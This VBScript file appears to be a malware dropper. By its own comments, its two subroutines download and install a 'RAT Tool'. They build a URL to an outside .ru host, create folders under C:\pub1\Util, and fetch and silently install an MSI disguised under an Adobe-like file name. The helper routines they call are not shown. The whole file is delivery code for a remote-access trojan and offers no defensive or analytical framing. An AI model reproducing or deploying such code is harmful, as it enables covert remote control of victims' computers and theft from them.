Option Explicit

' *****************************************************************************
' Predefined Constants
' *****************************************************************************
Const STR_DISK = "C:"
Const STR_FOLDER1 = "pub1"
Const STR_FOLDER2 = "Util"
Const THREAD_MSI = "AdobeDistribUniv.msi"
Const STR_SRCCODE = "SrcCode" 'Must be Same in MSI Installer'

Const HTTP_PREFIX = "http://" 'Prefix of Site Downloaded From'
Const HTTP_HOST = "anticriminalonline.ru" 'Host Name or IP address of the Site'
Const HTTP_PORT = ":80" 'Port of the Site'
Const HTTP_MAIN_PATH = "/Exponenta/" 'Path to Exponenta Project of the Site'

' *****************************************************************************

' *****************************************************************************
'
' SUBROUTINE TESTDOWNLOADED
'
' This Subroutine Downloads RAT Tool on Computer at Test Mode
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub Testdownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path      'Local Path to Command File with Drive Letter
        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX & HTTP_HOST & HTTP_PORT & HTTP_MAIN_PATH

        CreatedCascade STR_DISK, STR_FOLDER1, STR_FOLDER2
        UploadedFilesFromInt THREAD_MSI, Url, local_Path
        InstalledDownloaded local_Path, THREAD_MSI, STR_SRCCODE

End Sub

' *****************************************************************************
'
' SUBROUTINE SIMPLEDOWNLOADED
'
' This Subroutine Downloads RAT Tool on Computer
' The Subroutine Uses Predefined Constants
'
' PARAMETERS:   NONE
' RETURNS:      NONE
'
' *****************************************************************************
Sub Simpledownloaded()

        Dim Url         'Full URL Neme of the File in the Site
        Dim local_Path      'Local Path to Command File with Drive Letter
        Dim iTmp
        local_Path = STR_DISK & "\" & STR_FOLDER1 & "\" & STR_FOLDER2
        Url = HTTP_PREFIX & HTTP_HOST & HTTP_PORT & HTTP_MAIN_PATH

        iTmp = CreateTwocascadeFolders(STR_DISK, STR_FOLDER1, STR_FOLDER2)
        iTmp = UploadFilesFromInt(THREAD_MSI, Url, local_Path)
        iTmp = InstallDownloaded(local_Path, THREAD_MSI, STR_SRCCODE)

End Sub
